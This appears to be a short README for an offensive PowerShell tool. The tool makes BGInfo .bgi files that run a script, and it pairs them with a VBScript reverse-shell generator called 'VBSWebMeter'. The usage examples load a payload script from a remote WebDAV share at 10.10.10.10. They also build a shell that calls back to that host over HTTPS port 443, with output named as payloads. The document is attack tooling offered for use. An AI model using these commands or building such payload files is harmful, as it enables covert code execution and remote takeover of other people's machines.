# BGInfo
2 Functions used to create a .BGI file executing script.
Thanks to Cn33liz - @Cneelis for VBSWebMeter.

How to use the functions:

# Example 1
New-BGIFile -FileName "StartCMD.bgi" -Script "StartCMD.vbs" -OutFilePath "C:\BGIPayload"

# Example 2
New-BGIFile -FileName "MyPayload.bgi" -Script "\\10.10.10.10\webdav\VBSMeterShell.vbs" -OutFilePath "C:\BGIPayload"

# Example 3
New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "Yes" -OutFilePath "C:\BGIPayload" -OutFile "VBSMeterShell.vbs"


